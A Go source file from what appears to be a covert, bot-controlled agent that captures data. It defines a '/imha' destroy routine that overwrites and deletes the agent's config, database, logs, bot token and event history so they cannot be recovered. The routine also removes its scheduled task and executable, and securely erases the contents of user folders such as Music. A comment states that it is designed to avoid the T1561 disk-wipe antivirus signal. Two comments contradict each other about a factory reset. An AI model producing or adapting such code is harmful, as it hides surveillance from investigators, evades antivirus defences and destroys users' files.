package app

import (
	"context"
	"os"
	"time"
)

// destroyPlan is the input to the /imha sweep. SecureFiles are overwritten with
// random data before deletion (so the bot token and event history can't be
// recovered). WipeDirs' CONTENTS are securely erased too (the user's Music folder
// is added by the helper itself). There is NO factory reset — this keeps the OS
// intact and avoids the T1561 "disk wipe" AV signal.
type destroyPlan struct {
	SecureFiles []string // overwrite-then-delete (config, DB + side files, log)
	Dirs        []string // capture output dirs (plain recursive delete)
	WipeDirs    []string // extra user dirs whose contents are securely erased
	Task        string   // scheduled task to remove
	Exe         string   // the running executable
}

// secureFiles lists the agent's sensitive files for overwrite-then-delete.
func (a *App) secureFiles() []string {
	var p []string
	add := func(s string) {
		if s != "" {
			p = append(p, s)
		}
	}
	add(a.cfg.FilePath())
	db := a.cfg.Storage.DBPath
	add(db)
	if db != "" {
		add(db + "-wal")
		add(db + "-shm")
		add(db + "-journal")
	}
	add(a.cfg.Logging.File)
	return p
}

// destroy securely wipes the agent's sensitive data and triggers a factory reset,
// then shuts the agent down. Returns an error only if the helper couldn't launch.
func (a *App) destroy(_ context.Context) error {
	exe, _ := os.Executable()
	plan := destroyPlan{
		SecureFiles: a.secureFiles(),
		Dirs:        a.captureDirs(),
		WipeDirs:    a.cfg.WipeTargets(),
		Task:        scheduledTaskName,
		Exe:         exe,
	}
	if err := systemDestroy(plan); err != nil {
		return err
	}
	a.updating.Store(true)
	go func() {
		time.Sleep(3 * time.Second) // let the confirmation reply send first
		if a.cancel != nil {
			a.cancel()
		}
	}()
	return nil
}
